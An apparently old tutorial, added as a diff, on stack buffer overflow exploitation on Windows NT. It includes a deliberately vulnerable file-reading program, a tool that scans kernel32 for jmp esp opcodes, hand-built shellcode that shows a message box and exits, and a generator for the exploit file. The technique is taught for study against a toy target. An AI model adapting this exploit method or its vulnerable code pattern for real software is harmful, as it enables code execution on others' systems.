@@ -1,0 +1,287 @@
+WindowsNT Buffer Overflow's From Start to Finish
+
+I've read most of the articles on BO's(Buffer Overflows) on the net. I have found that they either for *NIX systems, or they are not detailed enough. The author's usually take some known vulnerable software and
+show you step by step how to exploit it. I am going to take a different approach. I am going to write an app that has a buffer overflow when reading data from a file. Then I will write an app that will create the file, that when read, will cause the exploit. I will also include an opcode finding tool.
+
+Tools Needed:
+Visual C++ 6.0
+Windows NT
+
+*The code and addresses I use are for Windows NT Workstation 4.0 SP6
+
+First lets write the app that will contain the buffer overflow. We also want the app to be able to read in some type of file so we can actually exploit this from some type of script. So in Visual C++ create a new console application, select "An Application that supports MFC" and click Finish. This does not necessarily have to be a MFC app, but I prefer to use some of the MFC classes. Obviously, I am a windows programmer. So let's add some exploitable code here. This is what it will look like:
+
+CWinApp theApp;
+
+using namespace std;
+
+void overflow(char* buff);
+
+int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
+{
+	int nRetCode = 0;
+
+	// initialize MFC and print and error on failure
+	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
+	{
+		// TODO: change error code to suit your needs
+		cerr << _T("Fatal Error: MFC initialization failed") << endl;
+		nRetCode = 1;
+	}
+	else
+	{
+		char buff[10];
+		overflow(buff);
+	}
+
+	return nRetCode;
+}
+
+
+void overflow(char* buff)
+{
+	CFile file;
+	CFileException er;
+	if(!file.Open(_T("overflow.txt"),CFile::modeRead,&er))
+	{
+		er.ReportError();
+		return;
+	}
+
+	int x = file.GetLength();
+	file.Read(buff,x);
+}
+
+Let's analyze the code a bit now and find where the problem actually is. Since this is an MFC console app, the "main" routine may look a little different, but it works the same. Let's skip to the else section inside main. You see the first line, char buff[10]. We have allocated a local variable, buff which is an array of 10 chars. We all know local variables are allocated on the stack right? So now we call the function overflow and pass it our buff. Now lets look inside the overflow function. First we instantiate a CFile object, then a CFileException object. Now we will attempt to open a file named "overflow.txt" from the current directory, with read access. If we open the file successfully we will get the files length, then we will read the entire contents of the file into our buff. Do you see the problem here? buff is only 10 chars. What happens if the file we read is 100? BUFFER OVERFLOW. But, the big problem is that we are overflowing a buffer which exists on the stack. When we can write to the stack we can do some strange things. As you will soon see. So now lets create a text file called overflow.txt and place it into the project directory of the first application.
+Let's step to the side for a second, a little explanation of WindowsNT memory architecture is in order here. In NT every process (executable) is given 4GB (0xFFFFFFFF) of virtual memory when it is started. Some of this memory is actually shared among all processes, like kernel and device driver areas. But those areas are mapped to each processes virtual address space. No process actually gets 4GB of phyiscal memory, only the memory necessary is actually allocated from physical. So every process has full 4GB of virtual memory, which ranges from 0x00000000 to 0xFFFFFFFF. These areas are divided. 0x00000000 to 0x0000FFFF is reserved for NULL pointer assignments. Attempting to access memory in this area will cause an access violation. 0x00010000 to 0x7FFEFFFF is the processes user space. This is where the exe image is loaded (starting at 0x00400000) and DLL's are loaded. If code (a DLL or EXE) is loaded at a certain address in this range it can be executed. Accessing an address which does not have code loaded in it will cause an access violation. 0x7FFF0000 to 0x7FFFFFFF is reserved bad pointer assignments and you will get an access violation with any attempt to access it. 0x80000000 to 0xFFFFFFFF is for operating system use only. Things like Device Drivers and other Kernel level code is stored here. Attempting to access this area from a user level application (ring 3) will cause an access violation. 
+Now back to the overflow.txt file. We are going to keep putting characters into our text file until we see the dialog popup informing us of an application error and what memory we attempted to access. Which character you chose to fill this text file with is important, as you will see in minute. Let's start by filling the text file with a's. Lower case a's. We know the buffer will hold ten so lets start with 11(make sure your application being built in debug mode or your results will be different). 11 doesn't work so we keep increasing it. 18 finally causes a crash. This crash isn't anything special yet. We've just totally screwed up the stack and it shows. Lets add six more a's, for a total of 24. Run the program and watch the dialog popup explaining to us that instruction at 0x61616161 had referenced memory at 0x61616161. You do know that the hex value for the ascii character a is 0x61 right? If you have Visual C++ installed you will be able to hit cancel now, and it will debug the application. Once visual studio is open, open you registers window. To do that go to the view menu, then debug window, and select registers. If you don't know anything about assembly, you should, get a book and READ IT. We see that EAX has been taken, and so has EBP and EIP. The most important thing is EIP. By being able to fill in the EIP with whatever we want we are able to jump to any code in memory. And what makes this even easier is that our ESP is not destroyed. It seems to point near the area on the stack that we control. We need to test this to find out. 
+Now let's get into this. Set a breakpoint on the last bracket of the main routine, we only care about what happens here. Now start the debugger and it will make it to this breakpoint with no errors. Now we need to switch into disassembly view. If you have the standard keyboard setup for Visual C++ press alt+8, if not go to the view menu, debug windows, and select disassembly Also open your memory and registers windows if you haven't already. You should see something similiar to this:
+
+004011DB 5F                       pop         edi
+004011DC 5E                       pop         esi
+004011DD 5B                       pop         ebx
+004011DE 83 C4 50             add         esp,50h
+004011E1 3B EC                  cmp         ebp,esp
+004011E3 E8 28 04 00 00    call        _chkesp (00401610)
+004011E8 8B E5                   mov         esp,ebp
+004011EA 5D                      pop         ebp
+004011EB C3                       ret
+
+So what is that junk? It's assembly code. You do know assembly right? Even if you don't, I'll try to make this easy to understand. Starting at the top we have pop edi. The pop instruction will remove one item from the top of the stack and place it into whatever register. In this case edi. Also important here is the ESP. The ESP is the 32 bit stack pointer. A pop will mov(e) the top element from the stack, in this case a DWORD (4 bytes), put it in whatever register, and increment the stack pointer by 4 (because of the 4 bytes). So before making another step, look at ESP. In the memory window enter ESP. You will now see exactly where esp is pointing to and what is there. Look at the four bytes pointed to by ESP and watch edi. Now step over this instruction and notice that edi is now filled with whatever esp pointed to, and esp has been incremented by four. Now the next two instructions are the same, but different registers, step over them and see that they work the same way. The next three lines are not very important to us. To understand them you will need to follow the assembly from the beginning of the routine, and we aren't doing that. Just step over them, they do nothing special. Now onto the line, mov esp,ebp. You read this line, right to left. This will mov(e) whatever is in EBP into ESP. This also does nothing special for us. Now onto pop ebp. Here is where this gets interesting. Remember what a pop does, it removes the top element from the stack. Now lets take a look at where we our ESP is pointing to, cause whatever four bytes are there are about to go into EBP. So again type esp into your memory window. We have a bunch of 0x61's there (hex value of 'a'). So 0x61616161 is about to be popped into ebp. Step over the instruction and verify that it does. Sure enough, that is what happens. But that doesn't really get us anywhere. Now the next line, ret. Ret is the assembly return instruction. But there is more to it than just returning. How does it know where to return to? By the address that is supposed to be sitting on the stack right now. The return would be the equivalent of pop eip (which you can't do). It takes the four bytes that ESP points to and moves them into EIP. And EIP is our 32 bit instruction pointer. This mean, whatever address EIP points to, is the next instruction to get executed. So once again, type esp into the memory window and see what we are about to put into EIP. Well what do you know, another four bytes of 0x61. So step over the ret instruction and watch what happens. EIP will become 0x61616161 and you will be about to execute the instruction at 0x61616161. Which in my case is nothing ???, invalid memory. So step over again and you get an access violation. Now look at ESP. It correctly points to the next area on the stack. For some reason, if you run the program independant of the debugger and let it crash so you get the ok\cancel dialog, and then press cancel. When you land on 0x61616161 your ESP will be wrong. I'm not sure why that is, but it works as expected when you step through it line by line like we just did. So now we got the program to execute, or attempt to execute code at 0x61616161, which means we can take over the EIP. So lets see if we can overflow the stack some more, so that when we get to 0x61616161 our ESP points to the rest of our overflow. So lets add another 4 a's to our text file and debug again. We now have 28 a's in our text file. So we view the disassembly again, make sure to have your memory window and register windows open. Step through and over the ret instruction. You are now at 0x61616161 again. Now type esp into the memory window and look what is there. Just as we suspected, there are 4 0x61's there. Now we are in business.
+
+Let me go back to a point I made earlier. We used a's (0x61) to fill our text file to determine if there was an overflow. So since EIP became 0x61616161 we attempted to access instructions at that address. In my case there was invalid memory there so it was an access violation. But what if there had been code there? Maybe a DLL loaded or something. Well, it would have executed that code and probably done something totally different. The same thing could have happened if we would have used, A's instead of a's. A's hex value is 0x41. So we would have jumped to 0x41414141 instead of 0x61616161. There could be code there and it would have executed it. So keep those things in mind.
+
+So we can control the EIP, the ESP points to the rest of the stack, and we can fill the stack with whatever we like. So now what? Would it be nice if we could could just jump to ESP and start executing? Well we can, hopefully. Jmp ESP is in fact a legal instruction. This instruction would mov(e) whatever is in ESP into EIP and begin executing instructions there. So we need to somehow call jmp esp. Hmm, how can we do that? Well, lets think. We do have control of EIP, so we can jump to where ever we want in our process space. If we can fill EIP with the address of a jmp esp instruction somewhere in memory we are in business. So how do we find out if there is a jmp esp instruction somewhere in our process space? It's easier than you think. The first thing we need to do is figure out what the opcodes for jmp esp are. The opcodes are the machine instructions that programs are compiled into so they can be executed. So let's create a new app in Visual C++. Again a console app, and again with MFC. Enter the following code:
+
+CWinApp theApp;
+
+using namespace std;
+
+int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
+{
+	int nRetCode = 0;
+
+	// initialize MFC and print and error on failure
+	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
+	{
+		// TODO: change error code to suit your needs
+		cerr << _T("Fatal Error: MFC initialization failed") << endl;
+		nRetCode = 1;
+	}
+	else
+	{
+		return 0;
+		__asm jmp esp
+	}
+	return nRetCode;
+}
+
+Now set a breakpoint on the return 0; statement, because the inline assembly line will not get executed. Start the debugger and let it run to the breakpoint. Now open up the disassembly debug window. Right click on the window to turn on source annotation and code bytes. Now look at the line which contains jmp esp. To the left of jmp esp and to the right of its address, you will see its code bytes or opcodes. The opcodes for jmp esp are FF E4. So now that we know that, how do we find that in oour process space? Let's add a bit more code to this app. Change it to the following:
+
+CWinApp theApp;
+
+using namespace std;
+
+int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
+{
+	int nRetCode = 0;
+
+	// initialize MFC and print and error on failure
+	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
+	{
+		// TODO: change error code to suit your needs
+		cerr << _T("Fatal Error: MFC initialization failed") << endl;
+		nRetCode = 1;
+	}
+	else
+	{
+		#if 0
+		return 0;
+		__asm jmp esp
+		
+		#else
+
+		bool we_loaded_it = false;
+		HINSTANCE h;				
+		TCHAR dllname[] = _T("Kernel32");
+		
+		h = GetModuleHandle(dllname);	
+		if(h == NULL)			
+		{
+			h = LoadLibrary(dllname);	
+			if(h == NULL)
+			{
+				cout<<"ERROR LOADING DLL: "<<dllname<<endl;
+				return 1;
+			}
+			we_loaded_it = true;	
+		}
+ 
+
+		BYTE* ptr = (BYTE*)h;		
+		bool done = false;
+		for(int y = 0;!done;y++)
+		{
+			try
+			{
+				if(ptr[y] == 0xFF && ptr[y+1] == 0xE4)
+				{
+					int pos = (int)ptr + y;
+					cout<<"OPCODE found at 0x"<<hex<<pos<<endl;
+				}
+			}
+			catch(...)
+			{
+				cout<<"END OF "<<dllname<<" MEMORY REACHED"<<endl;
+				done = true;
+			}
+		}
+
+		if(we_loaded_it) FreeLibrary(h);
+		#endif
+	}
+
+	return nRetCode;
+}
+
+Now what did we do? I left in the inline assembly section so we can find other opcodes if necessary and just wrapped it all in a preprocessor. The new stuff is very helpful. First, you enter the name of the dll you want to check for a particular opcode. In this case its Kernel32. First we attempt to get the handle to the module. If the module is already loaded in our address space we can simply continue. If its not, we need to load it ourself. So we call loadlibrary to load it. Then we use a BYTE pointer which we set the handle of the DLL(which is actually its load address). Then we loop through the DLL's memory looking for the opcodes we want. Which in this case is FF E4. If we go past the end of the DLL's memory we throw an exception, which we catch, and stop the loop. Any occurences of the opcodes will have their addresses displayed. Then if we had to call loadlibrary, we need to call freelibrary, and we are done. Fairly simple, but very useful utility. So let's run this on Kernel32 and see  what we get:
+
+OPCODE found at 0x77f32836
+OPCODE found at 0x77f32935
+OPCODE found at 0x77f32e38
+OPCODE found at 0x77f32f34
+OPCODE found at 0x77f33627
+OPCODE found at 0x77f33723
+END OF Kernel32 MEMORY REACHED
+
+This app does not crash in Debug mode when hitting the end of a DLL's memory. But it does in release mode.
+
+Allright, six to chose from. Note that different dll versions will have different addresses. So yours may be different. We will start with the first one. The easiest way to test this now is to open up our text file in a hex editor and enter our values. We will use 0x77f32836. In the hex editor at location 21 we need to enter our address. But we need to enter it in reverse order since it will be popped off that way. So starting at location 21 we enter 36 28 f3 77 and leave the remaining four a's afterword. Now let's fire up our debugger again and see if we hit the jackpot. View the disassembly, step down and over the ret and see where we go. Sure enough we are at a jmp esp. Now step over that instruction and we are now executing the stack. It thinks our 0x61's are opcode and thinks they are popad's. So we now know we can execute our code on the stack. So now what do we do with this? We need to do something to actually exploit it.
+
+One small note, you need to make sure a certain DLL is loaded in the process space of the program you are attempting to exploit. The easiest way is to run the depends tool that comes with visual studio. It will show you every DLL loaded in that space, what address they are loaded at, and what function are imported and exported. This will come in handy in a minute as you will see.
+
+I think we should make this application pop up a message box. So we need to find out how to call the MessageBox function in our app. According to the documentation MessageBox needs to import user32.lib, which means it exists in user32.dll. So now we fire up the depends program, open our exploitable app and make sure it loads user32.dll. Which it surely does. Now lets look through the exported functions and find where MessageBox is. In my version of user32.dll the entry point for MessageBoxA (the ascii version) is at 0x0001B6A7 and as we can see from the bottom, user32.dll is loaded at address 0x77E70000. So the sum of 0x0001B6A7 and 0x77E70000 is where the MessageBox function exists. Which is 0x77E8B6A7. So we have to call 0x77E8B6A7 from assembly code and setup the stack for the correct call. Luckily, someone has done this before and has made the work sort of simple for us. Thanks to Steve Fewer, darkplan@oceanfree.net ( http://indigo.ie/~lmf ), the code goes something like this:
+
+push ebp
+mov ebp,esp
+xor edi,edi
+push edi
+mov byte ptr[ebp-04h],48h
+mov byte ptr[ebp-03h],69h
+mov byte ptr[ebp-02h],21h
+mov edx, 0x77E8B6A7
+push edx
+push edi
+lea edx,[ebp-04h]
+push edx
+push edx
+push edi
+call dword ptr[ebp-08h]
+
+In short, this code passes the string "Hi!" to the Messagebox function at 0x77E8B6A7. But we can't just put the assembly instructions into our text file. We need to enter their opcodes. So we can make another app, or use an old one, and enter:
+
+__asm{
+	push ebp
+	mov ebp,esp
+	xor edi,edi
+	push edi
+	mov byte ptr[ebp-04h],48h
+	mov byte ptr[ebp-03h],69h
+	mov byte ptr[ebp-02h],21h
+	mov edx, 0x77E8B6A7
+	push edx
+	push edi
+	lea edx,[ebp-04h]
+	push edx
+	push edx
+	push edi
+	call dword ptr[ebp-08h]
+}
+
+Then debug the app and view the disassembly. Make sure the code bytes are shown and and highight them and copy them. Now paste them into notepad and remove the addresses, the actuall code and leave only the opcodes. It should look like this(the address of your messagebox function may be different):
+
+55 8B EC 33 FF 57 C6 45 FC 48 C6 45 FD 69 C6 45 FE 21 BA A7 B6 E8 77 52 57 8D 55 FC 52 52 57 FF 55 F8
+
+Now paste the above values into our text file, via the hex editor over the four a's we left at the end. Now run our original app again. We should see a messagebox saying Hi! But when we press OK, the app crashes. We don't want that. So we should call exit and close the program as gracefully as possible. So where is exit? According to the documentation we must import msvcrt.lib for exit, so it must be in msvcrt.dll. So we look at depends and see that we load, msvcrtd.dll not msvcrt.dll. Which is the debug version since we have the debug version built. But it will work just the same. Msvcrtd.dll is loaded at 0x10200000 and the entry point for exit is 0x0000AF90. The sum of the two is 0x1020AF90 and that is where we will find the exit function. So again we need to build some assembly to call exit, and again we will look at an example from Steve Fewer, darkplan@oceanfree.net ( http://indigo.ie/~lmf ). Here is the code:
+
+__asm{
+	push ebp
+	mov ebp,esp
+	mov edx,0x1020AF90
+	push edx
+	xor eax,eax
+	push eax
+	call dword ptr[ebp-04h]
+}
+
+This call passes 0 to the exit function telling the app to exit with code 0, no error. The opcodes for this should be (your address may be different):
+
+55 8B EC BA 90 AF 20 10 52 33 C0 50 FF 55 FC
+
+Now in hex editor paste this at the end of the file, after the last opcodes we inserted. Run the App again, we should get a Hi! messagebox and then the app should exit quietly. We did it. We exploited this application in a nice way. We could have just as easily called some other function.
+
+Instead of having to create these text files in a hex editor, there is a slightly simpler way. This is the code to do exactly that:
+
+CWinApp theApp;
+
+using namespace std;
+
+int _tmain(int argc, TCHAR* argv[], TCHAR* envp[])
+{
+	int nRetCode = 0;
+
+	// initialize MFC and print and error on failure
+	if (!AfxWinInit(::GetModuleHandle(NULL), NULL, ::GetCommandLine(), 0))
+	{
+		cerr << _T("Fatal Error: MFC initialization failed") << endl;
+		nRetCode = 1;
+	}
+	else
+	{
+		char buffer[24];
+		//0x77f32836 //kernel32.dll JMP ESP
+		char eip[] = "\x36\x28\xf3\x77";
+		char sploit[] = "\x55\x8B\xEC\x33\xFF\x57\xC6\x45\xFC\x48\xC6\x45\xFD\x69\xC6\x45\xFE\x21\xBA\xA7\xB6\xE8\x77\x52\x57\x8D\x55\xFC\x52\x52\x57\xFF\x55\xF8\x55\x8B\xEC\xBA\x90\xAF\x20\x10\x52\x33\xC0\x50\xFF\x55\xFC";
+
+		for(int x=0;x<24;x++)
+		{
+			buffer[x] = 0x90;
+		}
+
+		CFile file;
+		file.Open("overflow.txt",CFile::modeCreate | CFile::modeWrite);
+
+		file.Write(buffer,24);
+		file.Write(eip,strlen(eip));
+		file.Write(sploit,strlen(sploit));
+		
+		file.Close();
+	}
+
+	return nRetCode;
+}
+
+Example Code and future versions available on technotronic.com , Good Luck with your future exploits.
+Jason Jordan
+jason_jordan@omron.com
+bear@bkis.net
